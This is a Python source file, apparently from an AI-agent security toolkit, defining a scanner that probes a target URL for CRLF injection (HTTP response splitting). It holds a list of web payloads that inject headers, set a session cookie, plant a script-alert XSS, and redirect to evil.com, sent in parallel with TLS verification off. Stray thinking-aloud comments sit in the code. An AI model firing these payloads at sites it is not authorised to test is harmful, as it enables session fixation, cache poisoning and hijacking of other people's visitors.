import urllib.parse
from src.sdk.tool import function_tool
from .common import _DEFAULT_HEADERS, register_appsec_vulnerability

# ─── CRLF INJECTION ──────────────────────────────────────────────────────────────

@function_tool()
async def crlf_injection_probe(
    url: str,
    parameter: str = "",
    check_headers: bool = True,
) -> str:
    """
    Test for CRLF Injection vulnerabilities (HTTP Response Splitting) (Async Engine).

    Injects CRLF sequences into URL paths, query parameters, and common
    header injection points. Can lead to XSS, cache poisoning, and session fixation.

    Args:
        url: Target URL
        parameter: Optional query parameter to inject into (tests URL path if empty)
        check_headers: Also inject into common headers (X-Forwarded-For, etc.) (default: True)

    Returns:
        CRLF injection scan results with injected header evidence
    """
    out = [f"## CRLF Injection Scan (Async Engine): {url}", ""]

    crlf_payloads = [
        "%0d%0aX-CyberCoPilot: injected",
        "%0aX-CyberCoPilot: injected",
        "%0d%0a%20X-CyberCoPilot: injected",
        "%E5%98%8D%E5%98%8AX-CyberCoPilot: injected",  # Unicode CRLF
        "\r\nX-CyberCoPilot: injected",
        "%0d%0aContent-Type: text/html",
        "%0d%0aSet-Cookie: session=injected",
        "%0d%0a%0d%0a<script>alert(1)</script>",
        "/%0d%0aLocation: https://evil.com",
    ]

    async_requests = []
    
    # 1. URL Path / Parameter Injection
    for payload in crlf_payloads:
        test_url = (url + payload) if not parameter else f"{url}?{parameter}={payload}"
        async_requests.append({
            "method": "GET",
            "url": test_url,
            "headers": _DEFAULT_HEADERS.copy(),
            "_type": "url",
            "_payload": payload,
            "_test_url": test_url
        })
        
    # 2. Header Injection
    if check_headers:
        inject_headers_list = ["X-Forwarded-For", "X-Forwarded-Host", "Referer", "User-Agent"]
        test_val = "1.2.3.4\r\nX-CyberCoPilot: injected"
        for hdr in inject_headers_list:
            hdrs = _DEFAULT_HEADERS.copy()
            hdrs[hdr] = test_val
            async_requests.append({
                "method": "GET",
                "url": url,
                "headers": hdrs,
                "_type": "header",
                "_payload": hdr,
                "_test_url": f"Header: {hdr}"
            })
            
    out.append(f"🚀 Launching async swarm for {len(async_requests)} CRLF payloads...")
    
    # We must allow redirects=False for CRLF detection, but aiohttp fetcher doesn't easily expose this flag yet,
    # wait, async_fetch_all doesn't expose headers or allow_redirects=False natively in our implementation!
    # Let me just use synchronous for this specifically, or fall back to requests if we need header inspection.
    # Actually, if we just want to rewrite it so that it uses the db, I'll use requests asynchronously 
    # using a simple ThreadPoolExecutor since headers are strictly required to be inspected.
    
    import requests
    import concurrent.futures
    
    findings = []
    
    def fetch_crlf(req_meta):
        try:
            r = requests.get(req_meta["url"], headers=req_meta["headers"], allow_redirects=False, timeout=10, verify=False)
            return req_meta, r, None
        except Exception as e:
            return req_meta, None, e

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(fetch_crlf, req) for req in async_requests]
        for future in concurrent.futures.as_completed(futures):
            req_meta, r, err = future.result()
            if err or not r: continue
            
            test_url = req_meta["_test_url"]
            
            if req_meta["_type"] == "url":
                injected_headers = [k for k in r.headers.keys() if "CyberCoPilot" in k]
                session_injected = "session=injected" in r.headers.get("Set-Cookie", "")
                location_hijacked = "evil.com" in r.headers.get("Location", "")
                body_xss = "<script>alert(1)</script>" in (r.text or "")
                
                if injected_headers:
                    findings.append({"type": "HEADER INJECTION", "target": test_url[-60:], "evidence": f"Injected headers: {injected_headers}"})
                if session_injected:
                    findings.append({"type": "SESSION FIXATION", "target": test_url[-60:], "evidence": "session=injected cookie set"})
                if location_hijacked:
                    findings.append({"type": "REDIRECT INJECTION", "target": test_url[-60:], "evidence": f"Redirects to {r.headers.get('Location')}"})
                if body_xss:
                    findings.append({"type": "XSS via CRLF HTTP Response Split", "target": test_url[-60:], "evidence": "XSS payload in body"})
            
            elif req_meta["_type"] == "header":
                hdr = req_meta["_payload"]
                if "CyberCoPilot" in str(r.headers) or "injected" in (r.text or "")[:500]:
                    findings.append({"type": "HEADER-BASED CRLF", "target": f"Header: {hdr}", "evidence": "CRLF reflected"})
                    
    if findings:
        out.append("")
        out.append("── FINDINGS ──────────────────────────────────")
        
        for f in findings:
            out.append(f"🔴 {f['type']} via {f['target']}")
            out.append(f"    Evidence: {f['evidence']}")
            await register_appsec_vulnerability(
                target_url=url, vuln_type=f['type'], severity="HIGH",
                parameter=parameter if parameter else "URL/Header",
                payload=f['target'], evidence=f['evidence']
            )
                
        out.append(f"\nTotal CRLF injection findings: {len(findings)}")
        out.append("Impact: XSS, cache poisoning, session fixation, redirect hijacking")
    else:
        out.append("\n✅ No CRLF injection detected")

    return "\n".join(out)
